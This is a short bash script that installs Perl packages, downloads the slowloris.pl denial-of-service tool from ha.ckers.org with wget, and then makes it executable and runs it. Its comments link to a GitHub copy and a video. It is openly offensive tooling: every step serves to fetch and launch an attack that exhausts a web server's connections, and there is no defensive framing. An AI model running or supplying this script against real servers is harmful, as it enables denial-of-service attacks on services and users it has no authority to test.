#!/bin/bash
set -xv

#https://github.com/llaera/slowloris.pl
#https://www.youtube.com/watch?v=enTei0bVCpo

sudo apt-get install perl libwww-mechanize-shell-perl perl-mechanize

#wget https://github.com/llaera/slowloris.pl/blob/master/slowloris.pl
wget http://ha.ckers.org/slowloris/slowloris.pl
chmod +x slowloris.pl
./slowloris.pl

chmod +x slowloris.pl
